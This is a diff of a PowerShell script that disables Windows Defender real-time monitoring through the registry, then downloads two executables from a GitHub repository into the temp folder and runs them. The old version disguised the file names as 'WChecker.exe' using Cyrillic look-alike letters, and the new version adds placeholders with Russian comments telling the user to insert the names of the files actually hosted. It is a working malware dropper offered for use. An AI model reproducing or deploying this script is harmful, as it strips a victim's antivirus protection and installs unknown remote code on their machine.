@@ -40,34 +40,37 @@ New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -
 
 Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 
-# Download and run TWO different files
+# ===== ПОМЕНЯЙ ЭТИ ИМЕНА НА ТЕ, ЧТО РЕАЛЬНО ЛЕЖАТ В ТВОЁМ РЕПОЗИТОРИИ =====
+$fileName1 = "proga1.exe"   # <-- ЗАМЕНИТЬ
+$fileName2 = "proga2.exe"   # <-- ЗАМЕНИТЬ
+# ========================================================================
+
 $tempFolder = [System.IO.Path]::GetTempPath()
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# FIRST file - with Russian lowercase "е"
-$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChеcker.exe"
-$dest1 = Join-Path $tempFolder "Program1.exe"
+$baseUrl = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/"
+$url1 = $baseUrl + $fileName1
+$url2 = $baseUrl + $fileName2
 
-# SECOND file - with Russian uppercase "С"
-$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WСhecker.exe"
+$dest1 = Join-Path $tempFolder "Program1.exe"
 $dest2 = Join-Path $tempFolder "Program2.exe"
 
 $wc = New-Object System.Net.WebClient
 $wc.Headers.Add("User-Agent", "Mozilla/5.0")
 
-Write-Host "Downloading FIRST program (Russian 'e')..." -ForegroundColor Yellow
+Write-Host "Downloading FIRST: $fileName1" -ForegroundColor Yellow
 try {
     $wc.DownloadFile($url1, $dest1)
-    Write-Host "Running FIRST program" -ForegroundColor Green
+    Write-Host "Running FIRST" -ForegroundColor Green
     Start-Process -FilePath $dest1
 } catch {
     Write-Host "FIRST failed: $_" -ForegroundColor Red
 }
 
-Write-Host "Downloading SECOND program (Russian 'C')..." -ForegroundColor Yellow
+Write-Host "Downloading SECOND: $fileName2" -ForegroundColor Yellow
 try {
     $wc.DownloadFile($url2, $dest2)
-    Write-Host "Running SECOND program" -ForegroundColor Green
+    Write-Host "Running SECOND" -ForegroundColor Green
     Start-Process -FilePath $dest2
 } catch {
     Write-Host "SECOND failed: $_" -ForegroundColor Red
